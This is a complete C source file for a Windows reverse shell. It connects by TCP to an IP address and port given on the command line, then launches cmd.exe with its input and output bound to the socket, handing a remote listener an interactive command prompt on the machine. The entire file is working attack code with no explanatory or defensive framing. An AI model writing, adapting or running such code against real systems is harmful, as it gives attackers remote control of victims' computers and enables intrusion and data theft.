#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
        WSADATA wsaData;
        SOCKET sock;
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        struct sockaddr_in addr;
        int port;
        char *host;
        
        if (argc < 3) {
           printf("Usage: %s ip port\n", *argv);
        }
        
        host = argv[1];
        port = atoi(argv[2]);

        memset(&addr, 0x00, sizeof(addr));
        memset(&si, 0x00, sizeof(si));
        
        WSAStartup(MAKEWORD(2,0),&wsaData);
        sock = WSASocket(AF_INET, SOCK_STREAM, NULL, NULL, NULL, NULL);
        if (sock == INVALID_SOCKET) {
           printf("cannot create socket");
        }
        
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = inet_addr(host);
        
        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
            printf("cannot connect to %s:%i\n", host, port);                      
        }
        
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = si.hStdOutput = si.hStdError = (void *)sock;
        
        CreateProcess(NULL, "cmd", NULL, NULL, true, NULL, NULL, NULL, &si, &pi);
        
        return 0;
}
